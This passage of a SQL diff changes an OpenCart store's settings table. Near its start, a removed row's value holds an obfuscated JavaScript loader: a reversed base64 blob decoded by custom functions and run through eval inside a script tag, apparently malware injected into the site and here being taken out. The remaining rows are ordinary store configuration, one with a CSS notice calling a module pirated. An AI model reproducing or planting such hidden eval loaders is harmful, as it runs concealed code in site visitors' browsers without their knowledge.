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'';function _1l1(data){var OO0lOI="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";var o1,o2,o3,h1,h2,h3,h4,bits,i=0,enc='''';do{h1=OO0lOI.indexOf(data.charAt(i++));h2=OO0lOI.indexOf(data.charAt(i++));h3=OO0lOI.indexOf(data.charAt(i++));h4=OO0lOI.indexOf(data.charAt(i++));bits=h1<<18|h2<<12|h3<<6|h4;o1=bits>>16&0xff;o2=bits>>8&0xff;o3=bits&0xff;if(h3==64){enc+=String.fromCharCode(o1)}else if(h4==64){enc+=String.fromCharCode(o1,o2)}else{enc+=String.fromCharCode(o1,o2,o3)}}while(i<data.length);return enc} function OO0(string){ var ret = '''', i = 0;	for ( i = string.length-1; i >= 0; i-- ){ ret += string.charAt(i);} return ret; }eval(_1l1(OO0(O10)));</script>', 0),
-(952, 0, 'config', 'config_affiliate_commission', '5', 0),
-(949, 0, 'config', 'config_stock_checkout', '0', 0),
-(948, 0, 'config', 'config_stock_warning', '0', 0),
-(947, 0, 'config', 'config_stock_display', '0', 0),
-(946, 0, 'config', 'config_order_mail', '1', 0),
-(945, 0, 'config', 'config_complete_status', 'a:1:{i:0;s:1:"5";}', 1),
-(944, 0, 'config', 'config_processing_status', 'a:1:{i:0;s:1:"2";}', 1),
-(943, 0, 'config', 'config_order_status_id', '1', 0),
-(941, 0, 'config', 'config_checkout_guest', '1', 0),
-(942, 0, 'config', 'config_checkout_id', '5', 0),
-(940, 0, 'config', 'config_cart_weight', '1', 0),
-(939, 0, 'config', 'config_api_id', '1', 0),
-(938, 0, 'config', 'config_invoice_prefix', 'INV-2015-00', 0),
-(937, 0, 'config', 'config_account_mail', '0', 0),
-(936, 0, 'config', 'config_account_id', '3', 0),
-(935, 0, 'config', 'config_login_attempts', '5', 0),
-(934, 0, 'config', 'config_customer_price', '0', 0),
-(932, 0, 'config', 'config_customer_group_id', '1', 0),
-(933, 0, 'config', 'config_customer_group_display', 'a:1:{i:0;s:1:"1";}', 1),
-(931, 0, 'config', 'config_customer_online', '0', 0),
-(928, 0, 'config', 'config_tax', '0', 0),
-(929, 0, 'config', 'config_tax_default', 'shipping', 0),
-(930, 0, 'config', 'config_tax_customer', 'shipping', 0),
-(927, 0, 'config', 'config_voucher_max', '1000', 0),
-(926, 0, 'config', 'config_voucher_min', '1', 0),
-(923, 0, 'config', 'config_review_status', '1', 0),
-(924, 0, 'config', 'config_review_guest', '1', 0),
-(925, 0, 'config', 'config_review_mail', '0', 0),
-(913, 0, 'config', 'config_language', 'ru', 0),
-(914, 0, 'config', 'config_admin_language', 'ru', 0),
-(915, 0, 'config', 'config_currency', 'RUB', 0),
-(916, 0, 'config', 'config_currency_auto', '1', 0),
-(917, 0, 'config', 'config_length_class_id', '1', 0),
-(918, 0, 'config', 'config_weight_class_id', '1', 0),
-(919, 0, 'config', 'config_product_count', '1', 0),
-(920, 0, 'config', 'config_product_limit', '15', 0),
-(921, 0, 'config', 'config_product_description_length', '100', 0),
-(922, 0, 'config', 'config_limit_admin', '20', 0),
-(912, 0, 'config', 'config_zone_id', '', 0),
-(910, 0, 'config', 'config_layout_id', '4', 0),
-(911, 0, 'config', 'config_country_id', '176', 0),
-(909, 0, 'config', 'config_template', 'service', 0),
-(908, 0, 'config', 'config_meta_keyword', '', 0),
-(907, 0, 'config', 'config_meta_description', 'Мой магазин', 0),
-(906, 0, 'config', 'config_meta_title', 'Интернет магазин Opencart &quot;Русская сборка&quot;', 0),
-(905, 0, 'config', 'config_comment', '', 0),
-(904, 0, 'config', 'config_open', '', 0),
-(896, 0, 'config', 'config_name', 'Интернет магазин Opencart &quot;Русская сборка&quot;', 0),
-(897, 0, 'config', 'config_owner', 'Иванов Иван', 0),
-(898, 0, 'config', 'config_address', 'г. Москва, ул. Ленина 10 оф. 32', 0),
-(899, 0, 'config', 'config_geocode', '', 0),
-(900, 0, 'config', 'config_email', 'dimonich41@gmail.com', 0),
-(901, 0, 'config', 'config_telephone', '495 999-99-99', 0),
-(902, 0, 'config', 'config_fax', '495 888-88-88', 0),
-(903, 0, 'config', 'config_image', '', 0),
-(1017, 0, 'ascp_settings', 'ascp_settings', 'a:37:{s:10:"blog_small";a:2:{s:5:"width";s:0:"";s:6:"height";s:0:"";}s:8:"blog_big";a:2:{s:5:"width";s:0:"";s:6:"height";s:0:"";}s:16:"blog_num_records";s:0:"";s:17:"blog_num_comments";s:0:"";s:13:"blog_num_desc";s:0:"";s:19:"blog_num_desc_words";s:0:"";s:18:"blog_num_desc_pred";s:0:"";s:11:"format_date";s:5:"d M Y";s:12:"format_hours";s:6:" H:i:s";s:11:"format_time";s:1:"1";s:15:"complete_status";a:1:{i:0;s:1:"5";}s:11:"blog_search";s:1:"0";s:15:"category_status";s:1:"0";s:13:"cache_widgets";s:1:"0";s:11:"cache_pages";s:1:"0";s:13:"review_visual";s:1:"0";s:11:"blog_resize";s:1:"0";s:2:"og";s:1:"0";s:14:"end_url_record";s:7:".pirate";s:14:"get_pagination";s:8:"tracking";s:14:"colorbox_theme";s:1:"0";s:7:"further";a:3:{i:1;s:142:"&lt;div class=&quot;button-wrapper&quot;&gt;\r\n						&lt;ins class=&quot;grey-button&quot;&gt;Подробнее&lt;/ins&gt;\r\n					&lt;/div&gt;";i:3;s:3:"→";i:4;s:140:"&lt;div class=&quot;button-wrapper&quot;&gt;\r\n						&lt;ins class=&quot;grey-button&quot;&gt;Детально&lt;/ins&gt;\r\n					&lt;/div&gt;";}s:9:"box_begin";s:13:"&lt;div&gt;\r\n";s:7:"box_end";s:12:"&lt;/div&gt;";s:9:"box_share";s:0:"";s:14:"box_share_list";s:0:"";s:12:"comment_type";a:2:{i:2;a:2:{s:7:"type_id";s:1:"2";s:5:"title";a:3:{i:1;s:4:"Poll";i:3;s:0:"";i:4;s:0:"";}}i:3;a:2:{s:7:"type_id";s:1:"3";s:5:"title";a:3:{i:1;s:3:"FAQ";i:3;s:0:"";i:4;s:0:"";}}}s:13:"position_type";a:3:{s:14:"content_bottom";a:2:{s:7:"type_id";s:14:"content_bottom";s:5:"title";a:3:{i:1;s:35:"Содержание подвала";i:3;s:0:"";i:4;s:0:"";}}s:11:"column_left";a:2:{s:7:"type_id";s:11:"column_left";s:5:"title";a:3:{i:1;s:25:"Левая колонка";i:3;s:0:"";i:4;s:0:"";}}s:12:"column_right";a:2:{s:7:"type_id";s:12:"column_right";s:5:"title";a:3:{i:1;s:27:"Правая колонка";i:3;s:0:"";i:4;s:0:"";}}}s:3:"css";a:8:{s:3:"css";s:114:".seocmspro_content:after { content: &quot;The copyright infringement module SEO CMS TOP. Pirated software&quot;; }";s:14:"record-content";s:0:"";s:12:"blog-content";s:0:"";s:21:"ascp-list-title-color";s:0:"";s:20:"ascp-list-title-size";s:0:"";s:20:"ascp-list-title-line";s:0:"";s:26:"ascp-list-title-decoration";s:0:"";s:22:"ascp-list-title-weight";s:0:"";}s:7:"css_dir";s:5:"cache";s:12:"avatar_width";s:0:"";s:13:"avatar_height";s:0:"";s:14:"avatar_default";s:0:"";s:12:"avatar_admin";s:0:"";s:17:"avatar_buyproduct";s:0:"";s:10:"avatar_buy";s:0:"";s:10:"avatar_reg";s:0:"";}', 1),
-(1018, 0, 'ascp_comp_url', 'ascp_comp_url', '0', 0),
+(1592, 0, 'config', 'config_image_thumb_height', '228', 0),
+(1591, 0, 'config', 'config_image_thumb_width', '228', 0),
+(1590, 0, 'config', 'config_image_category_height', '80', 0),
+(1589, 0, 'config', 'config_image_category_width', '80', 0),
+(1587, 0, 'config', 'config_logo', 'catalog/logo.png', 0),
+(1588, 0, 'config', 'config_icon', 'catalog/cart.png', 0),
+(1585, 0, 'config', 'config_return_id', '0', 0),
+(1586, 0, 'config', 'config_return_status_id', '2', 0),
+(1584, 0, 'config', 'config_affiliate_mail', '0', 0),
+(1583, 0, 'config', 'config_affiliate_id', '4', 0),
+(1582, 0, 'config', 'config_affiliate_commission', '5', 0),
+(1581, 0, 'config', 'config_affiliate_auto', '0', 0),
+(1580, 0, 'config', 'config_affiliate_approval', '0', 0),
+(1579, 0, 'config', 'config_stock_checkout', '0', 0),
+(1578, 0, 'config', 'config_stock_warning', '0', 0),
+(1576, 0, 'config', 'config_order_mail', '1', 0),
+(1577, 0, 'config', 'config_stock_display', '0', 0),
+(1575, 0, 'config', 'config_complete_status', 'a:1:{i:0;s:1:"5";}', 1),
+(1574, 0, 'config', 'config_processing_status', 'a:1:{i:0;s:1:"2";}', 1),
+(1573, 0, 'config', 'config_order_status_id', '1', 0),
+(1572, 0, 'config', 'config_checkout_id', '5', 0),
+(1570, 0, 'config', 'config_cart_weight', '1', 0),
+(1571, 0, 'config', 'config_checkout_guest', '1', 0),
+(1568, 0, 'config', 'config_invoice_prefix', 'INV-2015-00', 0),
+(1569, 0, 'config', 'config_api_id', '1', 0),
+(1567, 0, 'config', 'config_account_mail', '0', 0),
+(1566, 0, 'config', 'config_account_id', '3', 0),
+(1565, 0, 'config', 'config_login_attempts', '5', 0),
+(1564, 0, 'config', 'config_customer_price', '0', 0),
+(1561, 0, 'config', 'config_customer_online', '0', 0),
+(1562, 0, 'config', 'config_customer_group_id', '1', 0),
+(1563, 0, 'config', 'config_customer_group_display', 'a:1:{i:0;s:1:"1";}', 1),
+(1557, 0, 'config', 'config_voucher_max', '1000', 0),
+(1558, 0, 'config', 'config_tax', '0', 0),
+(1559, 0, 'config', 'config_tax_default', 'shipping', 0),
+(1560, 0, 'config', 'config_tax_customer', 'shipping', 0),
+(1553, 0, 'config', 'config_review_status', '1', 0),
+(1554, 0, 'config', 'config_review_guest', '1', 0),
+(1555, 0, 'config', 'config_review_mail', '0', 0),
+(1285, 0, 'ascp_settings', 'ascp_settings', 'a:37:{s:10:"blog_small";a:2:{s:5:"width";s:0:"";s:6:"height";s:0:"";}s:8:"blog_big";a:2:{s:5:"width";s:0:"";s:6:"height";s:0:"";}s:16:"blog_num_records";s:0:"";s:17:"blog_num_comments";s:0:"";s:13:"blog_num_desc";s:0:"";s:19:"blog_num_desc_words";s:0:"";s:18:"blog_num_desc_pred";s:0:"";s:11:"format_date";s:5:"d M Y";s:12:"format_hours";s:6:" H:i:s";s:11:"format_time";s:1:"1";s:15:"complete_status";a:1:{i:0;s:1:"5";}s:11:"blog_search";s:1:"0";s:15:"category_status";s:1:"0";s:13:"cache_widgets";s:1:"0";s:11:"cache_pages";s:1:"0";s:13:"review_visual";s:1:"0";s:11:"blog_resize";s:1:"0";s:2:"og";s:1:"0";s:14:"end_url_record";s:7:".pirate";s:14:"get_pagination";s:8:"tracking";s:14:"colorbox_theme";s:1:"0";s:7:"further";a:3:{i:1;s:142:"&lt;div class=&quot;button-wrapper&quot;&gt;\r\n						&lt;ins class=&quot;grey-button&quot;&gt;Подробнее&lt;/ins&gt;\r\n					&lt;/div&gt;";i:3;s:3:"→";i:4;s:140:"&lt;div class=&quot;button-wrapper&quot;&gt;\r\n						&lt;ins class=&quot;grey-button&quot;&gt;Детально&lt;/ins&gt;\r\n					&lt;/div&gt;";}s:9:"box_begin";s:13:"&lt;div&gt;\r\n";s:7:"box_end";s:12:"&lt;/div&gt;";s:9:"box_share";s:0:"";s:14:"box_share_list";s:0:"";s:12:"comment_type";a:2:{i:2;a:2:{s:7:"type_id";s:1:"2";s:5:"title";a:3:{i:1;s:4:"Poll";i:3;s:0:"";i:4;s:0:"";}}i:3;a:2:{s:7:"type_id";s:1:"3";s:5:"title";a:3:{i:1;s:3:"FAQ";i:3;s:0:"";i:4;s:0:"";}}}s:13:"position_type";a:4:{s:14:"content_bottom";a:2:{s:7:"type_id";s:14:"content_bottom";s:5:"title";a:3:{i:1;s:35:"Содержание подвала";i:3;s:0:"";i:4;s:0:"";}}s:11:"column_left";a:2:{s:7:"type_id";s:11:"column_left";s:5:"title";a:3:{i:1;s:25:"Левая колонка";i:3;s:0:"";i:4;s:0:"";}}s:12:"column_right";a:2:{s:7:"type_id";s:12:"column_right";s:5:"title";a:3:{i:1;s:27:"Правая колонка";i:3;s:0:"";i:4;s:0:"";}}s:11:"content_top";a:2:{s:7:"type_id";s:11:"content_top";s:5:"title";a:3:{i:1;s:31:"Содержание шапки";i:3;s:0:"";i:4;s:0:"";}}}s:3:"css";a:8:{s:3:"css";s:114:".seocmspro_content:after { content: &quot;The copyright infringement module SEO CMS TOP. Pirated software&quot;; }";s:14:"record-content";s:0:"";s:12:"blog-content";s:0:"";s:21:"ascp-list-title-color";s:0:"";s:20:"ascp-list-title-size";s:0:"";s:20:"ascp-list-title-line";s:0:"";s:26:"ascp-list-title-decoration";s:0:"";s:22:"ascp-list-title-weight";s:0:"";}s:7:"css_dir";s:5:"cache";s:12:"avatar_width";s:0:"";s:13:"avatar_height";s:0:"";s:14:"avatar_default";s:0:"";s:12:"avatar_admin";s:0:"";s:17:"avatar_buyproduct";s:0:"";s:10:"avatar_buy";s:0:"";s:10:"avatar_reg";s:0:"";}', 1),
+(1286, 0, 'ascp_comp_url', 'ascp_comp_url', '0', 0),
+(1293, 0, 'ascp_widgets', 'ascp_widgets', 'a:7:{i:3;a:45:{s:6:"remove";s:0:"";s:4:"type";s:7:"records";s:17:"title_list_latest";a:3:{i:1;s:14:"Главная";i:3;s:14:"Главная";i:4;s:14:"Главная";}s:6:"avatar";a:2:{s:5:"width";s:0:"";s:6:"height";s:0:"";}s:6:"images";a:2:{s:5:"width";s:0:"";s:6:"height";s:0:"";}s:19:"blog_small_colorbox";s:1:"0";s:11:"images_view";s:1:"1";s:8:"template";s:8:"home.tpl";s:6:"cached";s:1:"1";s:12:"modal_status";s:1:"0";s:14:"template_modal";s:0:"";s:19:"block_records_width";s:0:"";s:6:"anchor";s:0:"";s:16:"anchor_templates";s:0:"";s:17:"number_per_widget";s:0:"";s:10:"pagination";s:1:"0";s:5:"limit";s:1:"0";s:4:"sort";s:1:"0";s:12:"desc_symbols";s:0:"";s:10:"desc_words";s:0:"";s:9:"desc_pred";s:0:"";s:5:"order";s:4:"sort";s:8:"order_ad";s:4:"desc";s:13:"author_status";s:1:"0";s:13:"avatar_status";s:1:"1";s:12:"title_status";s:1:"1";s:18:"description_status";s:1:"1";s:15:"category_status";s:1:"0";s:9:"view_date";s:1:"1";s:10:"view_share";s:1:"0";s:13:"view_comments";s:1:"1";s:11:"view_viewed";s:1:"0";s:11:"view_rating";s:1:"1";s:15:"category_button";s:1:"0";s:7:"related";a:2:{i:0;s:1:"3";i:1;s:1:"2";}s:7:"further";a:3:{i:1;s:0:"";i:3;s:0:"";i:4;s:0:"";}s:9:"box_begin";s:0:"";s:19:"box_begin_templates";s:0:"";s:7:"box_end";s:0:"";s:17:"box_end_templates";s:0:"";s:5:"store";a:1:{i:0;s:1:"0";}s:15:"customer_groups";a:4:{i:0;s:1:"1";i:1;s:2:"-1";i:2;s:2:"-2";i:3;s:2:"-3";}s:9:"doc_ready";s:1:"1";s:4:"ajax";s:1:"0";s:8:"reserved";s:0:"";}i:4;a:20:{s:6:"remove";s:0:"";s:4:"type";s:5:"blogs";s:17:"title_list_latest";a:3:{i:1;s:16:"Компания";i:3;s:16:"Компания";i:4;s:16:"Компания";}s:6:"avatar";a:2:{s:5:"width";s:0:"";s:6:"height";s:0:"";}s:12:"thumb_status";s:1:"0";s:8:"template";s:13:"blog_menu.tpl";s:6:"anchor";s:0:"";s:16:"anchor_templates";s:0:"";s:6:"cached";s:1:"1";s:8:"counting";s:1:"1";s:5:"blogs";a:1:{i:0;s:1:"4";}s:5:"store";a:1:{i:0;s:1:"0";}s:15:"customer_groups";a:4:{i:0;s:1:"1";i:1;s:2:"-1";i:2;s:2:"-2";i:3;s:2:"-3";}s:9:"box_begin";s:0:"";s:19:"box_begin_templates";s:0:"";s:7:"box_end";s:0:"";s:17:"box_end_templates";s:0:"";s:9:"doc_ready";s:1:"1";s:4:"ajax";s:1:"0";s:8:"reserved";s:0:"";}i:5;a:20:{s:6:"remove";s:0:"";s:4:"type";s:5:"blogs";s:17:"title_list_latest";a:3:{i:1;s:16:"Контакты";i:3;s:16:"Контакты";i:4;s:16:"Контакты";}s:6:"avatar";a:2:{s:5:"width";s:0:"";s:6:"height";s:0:"";}s:12:"thumb_status";s:1:"0";s:8:"template";s:13:"blog_menu.tpl";s:6:"anchor";s:0:"";s:16:"anchor_templates";s:0:"";s:6:"cached";s:1:"1";s:8:"counting";s:1:"1";s:5:"blogs";a:1:{i:0;s:1:"5";}s:5:"store";a:1:{i:0;s:1:"0";}s:15:"customer_groups";a:4:{i:0;s:1:"1";i:1;s:2:"-1";i:2;s:2:"-2";i:3;s:2:"-3";}s:9:"box_begin";s:0:"";s:19:"box_begin_templates";s:0:"";s:7:"box_end";s:0:"";s:17:"box_end_templates";s:0:"";s:9:"doc_ready";s:1:"1";s:4:"ajax";s:1:"0";s:8:"reserved";s:0:"";}i:6;a:45:{s:6:"remove";s:0:"";s:4:"type";s:6:"latest";s:17:"title_list_latest";a:3:{i:1;s:10:"Блоги";i:3;s:10:"Блоги";i:4;s:10:"Блоги";}s:6:"avatar";a:2:{s: